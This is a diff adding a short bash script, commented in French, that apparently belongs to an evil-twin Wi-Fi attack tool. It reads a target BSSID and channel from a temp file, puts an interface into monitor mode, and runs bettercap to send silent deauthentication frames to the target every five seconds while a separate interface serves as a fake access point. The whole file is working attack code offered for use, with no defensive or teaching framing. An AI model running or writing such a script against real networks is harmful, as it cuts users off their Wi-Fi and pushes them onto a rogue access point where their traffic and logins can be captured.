@@ -1,0 +1,24 @@
+#!/usr/bin/env bash
+# Deauth des clients de la cible via bettercap, sur une interface monitor
+# distincte du faux AP (wlan1 sert deja de faux AP).
+# Parametres lus dans /tmp/fennec-mirage-deauth :
+#   ligne 1 = interface monitor, ligne 2 = BSSID cible, ligne 3 = canal (optionnel)
+set -euo pipefail
+CFG=/tmp/fennec-mirage-deauth
+IFACE="$(sed -n '1p' "$CFG")"
+BSSID="$(sed -n '2p' "$CFG")"
+CANAL="$(sed -n '3p' "$CFG")"
+
+[ -n "$IFACE" ] && [ -n "$BSSID" ] || { echo "cible incomplete"; exit 1; }
+
+# Interface en mode monitor.
+ip link set "$IFACE" down 2>/dev/null || true
+iw dev "$IFACE" set type monitor 2>/dev/null || true
+ip link set "$IFACE" up 2>/dev/null || true
+
+EVAL="set wifi.interface $IFACE;"
+[ -n "$CANAL" ] && EVAL="$EVAL set wifi.recon.channel $CANAL;"
+EVAL="$EVAL wifi.recon on; set wifi.deauth.silent true;"
+EVAL="$EVAL set ticker.period 5; set ticker.commands \"wifi.deauth $BSSID\"; ticker on"
+
+exec bettercap -iface "$IFACE" -no-colors -eval "$EVAL"
